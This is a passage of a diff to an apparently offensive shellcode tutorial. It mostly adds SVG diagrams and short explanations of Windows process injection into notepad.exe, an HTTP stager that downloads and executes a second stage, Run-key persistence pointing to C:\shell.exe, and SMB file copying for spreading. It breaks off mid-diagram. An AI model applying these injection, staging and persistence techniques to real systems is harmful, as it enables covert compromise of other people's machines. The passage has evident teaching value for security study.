height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="375" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">3. Find</text><text x="375" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">cmp DWORD</text><line x1="420" y1="77" x2="445" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="450" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="500" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">4. Open</text><text x="500" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">OpenProcess</text><line x1="550" y1="77" x2="575" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="580" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="650" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">5. VirtualAllocEx</text><line x1="650" y1="100" x2="650" y2="130" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="400" y="135" width="160" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="480" y="158" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">6. WriteProcessMemory</text><line x1="480" y1="180" x2="480" y2="210" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="400" y="215" width="160" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="480" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">7. CreateRemoteThread</text><text x="480" y="252" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Code runs in target</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="280" rx="8" fill="#1e1e2e"/>
+<text x="375" y="30" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Process Injection Chain</text>
+<rect x="30" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="100" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">1. Snapshot</text>
+<text x="100" y="92" fill="#fab387" font-size="9" text-anchor="middle">CreateToolhelp32</text>
+<line x1="170" y1="77" x2="195" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="200" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="250" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">2. Enumerate</text>
+<text x="250" y="92" fill="#fab387" font-size="9" text-anchor="middle">Process32Next</text>
+<line x1="300" y1="77" x2="325" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="330" y="55" width="90" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="375" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">3. Find</text>
+<text x="375" y="92" fill="#fab387" font-size="9" text-anchor="middle">cmp DWORD</text>
+<line x1="420" y1="77" x2="445" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="450" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="500" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">4. Open</text>
+<text x="500" y="92" fill="#fab387" font-size="9" text-anchor="middle">OpenProcess</text>
+<line x1="550" y1="77" x2="575" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="580" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="650" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">5. VirtualAllocEx</text>
+<line x1="650" y1="100" x2="650" y2="130" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="400" y="135" width="160" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="480" y="158" fill="#cdd6f4" font-size="10" text-anchor="middle">6. WriteProcessMemory</text>
+<line x1="480" y1="180" x2="480" y2="210" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/>
+<rect x="400" y="215" width="160" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="480" y="238" fill="#a6e3a1" font-size="10" text-anchor="middle" font-weight="bold">7. CreateRemoteThread</text>
+<text x="480" y="252" fill="#cdd6f4" font-size="9" text-anchor="middle">Code runs in target</text>
+</svg></div>
 
 *Figure 15.1 - The seven-step injection chain: from process snapshot to remote code execution*
+
+### Cross-Process Memory Layout
+
+Once we locate the target PID, the injection writes our shellcode into the remote process's address space and starts a thread there.
+
+<div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs>
+  <marker id="ah15b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  <marker id="ah15c" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#f38ba8"/></marker>
+</defs>
+<rect width="750" height="360" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Cross-Process Injection Memory Layout</text>
+<!-- Source process -->
+<rect x="30" y="50" width="280" height="250" rx="8" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="170" y="75" fill="#89b4fa" font-size="13" text-anchor="middle" font-weight="bold">Source Process (Exploited)</text>
+<rect x="50" y="90" width="240" height="40" rx="4" fill="#1e1e2e" stroke="#fab387" stroke-width="1.5"/>
+<text x="170" y="115" fill="#fab387" font-size="11" text-anchor="middle">Shellcode (our payload bytes)</text>
+<rect x="50" y="145" width="240" height="30" rx="4" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+<text x="170" y="165" fill="#6c7086" font-size="10" text-anchor="middle">hProcess = OpenProcess(PID)</text>
+<rect x="50" y="190" width="240" height="30" rx="4" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+<text x="170" y="210" fill="#6c7086" font-size="10" text-anchor="middle">remoteAddr = VirtualAllocEx(RWX)</text>
+<rect x="50" y="235" width="240" height="30" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+<text x="170" y="255" fill="#a6e3a1" font-size="10" text-anchor="middle">WriteProcessMemory(hProc, remoteAddr, sc)</text>
+<!-- Arrow -->
+<line x1="310" y1="110" x2="430" y2="110" stroke="#f38ba8" stroke-width="2.5" stroke-dasharray="8,4" marker-end="url(#ah15c)"/>
+<text x="370" y="100" fill="#f38ba8" font-size="10" text-anchor="middle">WriteProcessMemory</text>
+<line x1="310" y1="250" x2="430" y2="200" stroke="#a6e3a1" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#ah15b)"/>
+<text x="370" y="240" fill="#a6e3a1" font-size="10" text-anchor="middle">CreateRemoteThread</text>
+<!-- Target process -->
+<rect x="435" y="50" width="280" height="250" rx="8" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+<text x="575" y="75" fill="#f38ba8" font-size="13" text-anchor="middle" font-weight="bold">Target Process (notepad.exe)</text>
+<rect x="455" y="90" width="240" height="40" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="2"/>
+<text x="575" y="115" fill="#f38ba8" font-size="11" text-anchor="middle" font-weight="bold">Shellcode COPY (RWX page)</text>
+<rect x="455" y="145" width="240" height="30" rx="4" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+<text x="575" y="165" fill="#6c7086" font-size="10" text-anchor="middle">Original code + data (unchanged)</text>
+<rect x="455" y="190" width="240" height="40" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="2"/>
+<text x="575" y="210" fill="#a6e3a1" font-size="11" text-anchor="middle" font-weight="bold">New Thread starts here</text>
+<text x="575" y="225" fill="#a6e3a1" font-size="9" text-anchor="middle">lpStartAddress = remoteAddr</text>
+<!-- Legend -->
+<rect x="160" y="318" width="430" height="30" rx="5" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+<text x="375" y="338" fill="#cdd6f4" font-size="10" text-anchor="middle">Our code runs inside notepad.exe -- survives even if the exploit process exits</text>
+</svg></div>
+
+*Figure 15.2 - The shellcode is copied across process boundaries and executed as a new thread inside the target*
 
 ---
 
@@ -1098,6 +1999,8 @@ find_process:
 A stager writes a small first stage that downloads and executes a larger second stage from an HTTP server.
 
 ### The Read Loop
+
+The read loop calls `InternetReadFile` in 4096-byte chunks, advancing the buffer pointer each time until zero bytes are returned.
 
 ```nasm
 read_loop:
@@ -1119,9 +2022,73 @@ read_loop:
 
 Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps the process alive.
 
-<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">HTTP Stager Flow</text><rect x="30" y="55" width="140" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="100" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">LoadLibraryA</text><text x="100" y="94" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">("wininet.dll")</text><line x1="170" y1="80" x2="195" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="200" y="55" width="125" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="262" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">InternetOpenA</text><line x1="325" y1="80" x2="350" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="355" y="55" width="150" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="430" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">InternetOpenUrlA</text><line x1="505" y1="80" x2="530" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="535" y="55" width="180" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="625" y="75" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">InternetReadFile</text><text x="625" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Loop until bytesRead = 0</text><line x1="625" y1="105" x2="625" y2="135" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="535" y="140" width="180" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="625" y="162" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">CreateThread(baseAddr)</text><text x="625" y="178" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Execute downloaded shellcode</text><rect x="200" y="220" width="350" height="40" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="375" y="245" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">VirtualAlloc(RWX) holds the second stage in memory</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="280" rx="8" fill="#1e1e2e"/>
+<text x="375" y="30" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">HTTP Stager Flow</text>
+<rect x="30" y="55" width="140" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="100" y="80" fill="#cdd6f4" font-size="10" text-anchor="middle">LoadLibraryA</text>
+<text x="100" y="94" fill="#fab387" font-size="9" text-anchor="middle">("wininet.dll")</text>
+<line x1="170" y1="80" x2="195" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/>
+<rect x="200" y="55" width="125" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="262" y="80" fill="#cdd6f4" font-size="10" text-anchor="middle">InternetOpenA</text>
+<line x1="325" y1="80" x2="350" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/>
+<rect x="355" y="55" width="150" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="430" y="80" fill="#cdd6f4" font-size="10" text-anchor="middle">InternetOpenUrlA</text>
+<line x1="505" y1="80" x2="530" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/>
+<rect x="535" y="55" width="180" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+<text x="625" y="75" fill="#f38ba8" font-size="10" text-anchor="middle" font-weight="bold">InternetReadFile</text>
+<text x="625" y="92" fill="#cdd6f4" font-size="9" text-anchor="middle">Loop until bytesRead = 0</text>
+<line x1="625" y1="105" x2="625" y2="135" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/>
+<rect x="535" y="140" width="180" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="625" y="162" fill="#a6e3a1" font-size="10" text-anchor="middle" font-weight="bold">CreateThread(baseAddr)</text>
+<text x="625" y="178" fill="#cdd6f4" font-size="9" text-anchor="middle">Execute downloaded shellcode</text>
+<rect x="200" y="220" width="350" height="40" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="375" y="245" fill="#cdd6f4" font-size="11" text-anchor="middle">VirtualAlloc(RWX) holds the second stage in memory</text>
+</svg></div>
 
 *Figure 16.1 - Staged payload: first stage fetches second stage over HTTP, reads in a loop, then executes*
+
+### Buffer Pointer Advancement
+
+Each iteration reads up to 4096 bytes. The buffer pointer advances by the number of bytes actually read so data is written contiguously.
+
+<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah16b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="280" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">InternetReadFile: Buffer Filling Loop</text>
+<!-- Memory bar -->
+<rect x="50" y="55" width="650" height="40" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="375" y="80" fill="#89b4fa" font-size="11" text-anchor="middle">VirtualAlloc'd RWX buffer (total size for second stage)</text>
+<!-- Iteration 1 -->
+<rect x="50" y="110" width="160" height="35" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="130" y="132" fill="#a6e3a1" font-size="10" text-anchor="middle" font-weight="bold">Iter 1: 4096 B</text>
+<line x1="130" y1="95" x2="130" y2="110" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16b)"/>
+<!-- Iteration 2 -->
+<rect x="215" y="110" width="160" height="35" rx="4" fill="#313244" stroke="#fab387" stroke-width="2"/>
+<text x="295" y="132" fill="#fab387" font-size="10" text-anchor="middle" font-weight="bold">Iter 2: 4096 B</text>
+<line x1="295" y1="95" x2="295" y2="110" stroke="#fab387" stroke-width="1.5"/>
+<!-- Iteration 3 -->
+<rect x="380" y="110" width="160" height="35" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+<text x="460" y="132" fill="#f38ba8" font-size="10" text-anchor="middle" font-weight="bold">Iter 3: 4096 B</text>
+<line x1="460" y1="95" x2="460" y2="110" stroke="#f38ba8" stroke-width="1.5"/>
+<!-- Iteration N -->
+<rect x="545" y="110" width="155" height="35" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1.5" stroke-dasharray="4,3"/>
+<text x="622" y="132" fill="#6c7086" font-size="10" text-anchor="middle">Iter N: &lt;4096 B</text>
+<!-- Pointer arrows -->
+<text x="50" y="170" fill="#cdd6f4" font-size="10">[ebp+0x34] advances by bytesRead each iteration:</text>
+<rect x="50" y="180" width="650" height="30" rx="4" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+<text x="130" y="200" fill="#a6e3a1" font-size="10" text-anchor="middle">ptr+0</text>
+<text x="295" y="200" fill="#fab387" font-size="10" text-anchor="middle">ptr+0x1000</text>
+<text x="460" y="200" fill="#f38ba8" font-size="10" text-anchor="middle">ptr+0x2000</text>
+<text x="622" y="200" fill="#6c7086" font-size="10" text-anchor="middle">ptr+0x3000</text>
+<!-- Stop condition -->
+<rect x="150" y="225" width="450" height="40" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="375" y="243" fill="#cdd6f4" font-size="11" text-anchor="middle">When bytesRead == 0 : loop exits, all data received</text>
+<text x="375" y="258" fill="#a6e3a1" font-size="10" text-anchor="middle">CreateThread(lpStartAddress = original buffer base)</text>
+</svg></div>
+
+*Figure 16.2 - Each loop iteration fills the next chunk of the buffer. When InternetReadFile returns 0 bytes, the payload is complete and ready for execution.*
 
 ---
 
@@ -1130,6 +2097,8 @@ Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps
 **Registry persistence** ensures our payload runs again after every reboot by writing to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
 
 ### Building the 12-DWORD Registry Path
+
+The registry path string is 52 characters long. We push it as DWORDs in reverse order, building the string on the stack from right to left.
 
 ```nasm
     xor   eax, eax
@@ -1151,7 +2120,74 @@ Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps
     mov   edi, esp
 ```
 
-<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Registry Persistence Flow</text><rect x="40" y="55" width="160" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="120" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">LoadLibraryA</text><text x="120" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="10" text-anchor="middle">("advapi32.dll")</text><line x1="200" y1="80" x2="235" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/><rect x="240" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="325" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">RegOpenKeyExA</text><text x="325" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(HKCU, Run key)</text><line x1="410" y1="80" x2="445" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/><rect x="450" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="535" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">RegSetValueExA</text><text x="535" y="92" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle">("Updater", path)</text><rect x="200" y="140" width="350" height="50" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="375" y="160" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</text><rect x="240" y="167" width="270" height="18" rx="3" fill="#1e1e2e" stroke="#89b4fa" stroke-width="0.5"/><text x="375" y="180" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle">"Updater" = "C:\shell.exe"</text><text x="375" y="230" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">On next login: Windows runs C:\shell.exe</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs>
+  <marker id="ah17s" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#a6e3a1"/></marker>
+</defs>
+<rect width="750" height="380" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Stack String Build: 12-DWORD Push Sequence</text>
+<text x="375" y="50" fill="#6c7086" font-size="10" text-anchor="middle">Each push writes 4 bytes, stack grows DOWN -- push order is REVERSE of read order</text>
+<!-- Stack frames - bottom to top reading order -->
+<text x="40" y="80" fill="#6c7086" font-size="10">Push order</text>
+<text x="610" y="80" fill="#6c7086" font-size="10">Resulting string</text>
+<rect x="130" y="88" width="130" height="22" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+<text x="195" y="104" fill="#f38ba8" font-size="10" text-anchor="middle" font-weight="bold">push 0x74666f53</text>
+<text x="600" y="104" fill="#a6e3a1" font-size="10" text-anchor="middle">"Soft"</text>
+<text x="40" y="104" fill="#6c7086" font-size="9">last</text>
+<rect x="130" y="113" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="129" fill="#cdd6f4" font-size="10" text-anchor="middle">push 0x65726177</text>
+<text x="600" y="129" fill="#cdd6f4" font-size="10" text-anchor="middle">"ware"</text>
+<rect x="130" y="138" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="154" fill="#cdd6f4" font-size="10" text-anchor="middle">push 0x63694d5c</text>
+<text x="600" y="154" fill="#cdd6f4" font-size="10" text-anchor="middle">"\Mic"</text>
+<rect x="130" y="163" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="179" fill="#cdd6f4" font-size="10" text-anchor="middle">push 0x6f736f72</text>
+<text x="600" y="179" fill="#cdd6f4" font-size="10" text-anchor="middle">"roso"</text>
+<rect x="130" y="188" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="204" fill="#cdd6f4" font-size="10" text-anchor="middle">push 0x575c7466</text>
+<text x="600" y="204" fill="#cdd6f4" font-size="10" text-anchor="middle">"ft\W"</text>
+<rect x="130" y="213" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="229" fill="#cdd6f4" font-size="10" text-anchor="middle">...</text>
+<text x="600" y="229" fill="#6c7086" font-size="10" text-anchor="middle">"indo" "ws\C" ...</text>
+<rect x="130" y="238" width="130" height="22" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="195" y="254" fill="#cdd6f4" font-size="10" text-anchor="middle">push 0x75525c6e</text>
+<text x="600" y="254" fill="#cdd6f4" font-size="10" text-anchor="middle">"n\Ru"</text>
+<rect x="130" y="263" width="130" height="22" rx="3" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+<text x="195" y="279" fill="#fab387" font-size="10" text-anchor="middle">push "n\0\0\0"</text>
+<text x="600" y="279" fill="#fab387" font-size="10" text-anchor="middle">"n" + null term</text>
+<text x="40" y="279" fill="#6c7086" font-size="9">first</text>
+<!-- Arrow showing ESP/EDI -->
+<line x1="270" y1="97" x2="310" y2="97" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah17s)"/>
+<text x="340" y="101" fill="#a6e3a1" font-size="10">EDI = ESP (start of string)</text>
+<!-- Result -->
+<rect x="100" y="305" width="550" height="30" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="375" y="325" fill="#a6e3a1" font-size="11" text-anchor="middle" font-weight="bold">Software\Microsoft\Windows\CurrentVersion\Run</text>
+<text x="375" y="360" fill="#6c7086" font-size="10" text-anchor="middle">Reading from EDI forward gives the correct ASCII path (little-endian byte order)</text>
+</svg></div>
+
+*Figure 17.2 - Each DWORD push adds 4 characters of the registry path. Because the stack grows downward, pushing in reverse order means EDI (pointing to ESP after all pushes) gives the correct forward-reading string.*
+
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="260" rx="8" fill="#1e1e2e"/>
+<text x="375" y="30" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Registry Persistence Flow</text>
+<rect x="40" y="55" width="160" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="120" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">LoadLibraryA</text>
+<text x="120" y="92" fill="#fab387" font-size="10" text-anchor="middle">("advapi32.dll")</text>
+<line x1="200" y1="80" x2="235" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/>
+<rect x="240" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="325" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">RegOpenKeyExA</text>
+<text x="325" y="92" fill="#fab387" font-size="10" text-anchor="middle">(HKCU, Run key)</text>
+<line x1="410" y1="80" x2="445" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/>
+<rect x="450" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+<text x="535" y="78" fill="#cdd6f4" font-size="10" text-anchor="middle">RegSetValueExA</text>
+<text x="535" y="92" fill="#f38ba8" font-size="10" text-anchor="middle">("Updater", path)</text>
+<rect x="200" y="140" width="350" height="50" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="375" y="160" fill="#cdd6f4" font-size="10" text-anchor="middle">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</text>
+<rect x="240" y="167" width="270" height="18" rx="3" fill="#1e1e2e" stroke="#89b4fa" stroke-width="0.5"/>
+<text x="375" y="180" fill="#a6e3a1" font-size="10" text-anchor="middle">"Updater" = "C:\shell.exe"</text>
+<text x="375" y="230" fill="#fab387" font-size="11" text-anchor="middle">On next login: Windows runs C:\shell.exe</text>
+</svg></div>
 
 *Figure 17.1 - Registry persistence: open the Run key, write the payload path, reboot triggers execution*
 
@@ -1180,11 +2216,67 @@ load_mpr_dll:
     call  dword ptr [ebp+0x10]  ; LoadLibraryA("mpr.dll")
 ```
 
-### NETRESOURCEA and CopyFileA
+### NETRESOURCEA Struct Layout
 
-Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName` pointing to the UNC path on the stack. Then authenticate with `WNetAddConnection2A` and copy with `CopyFileA`.
+Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName` pointing to the UNC path on the stack.
 
-<div align="center"><svg width="750" height="240" viewBox="0 0 750 240" xmlns="http://www.w3.org/2000/svg"><defs><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><rect width="750" height="240" rx="8" fill="#1e1e2e"/><text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" font-weight="bold">SMB File Copy Sequence</text><rect x="30" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="107" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">LoadLibraryA</text><text x="107" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">("mpr.dll")</text><line x1="185" y1="82" x2="225" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/><rect x="230" y="55" width="185" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="322" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">WNetAddConnection2A</text><text x="322" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">(&nr, pass, user, 0)</text><line x1="415" y1="82" x2="455" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/><rect x="460" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="537" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">CopyFileA</text><text x="537" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">(local, remote, FALSE)</text><rect x="220" y="145" width="310" height="40" rx="6" fill="#313244" 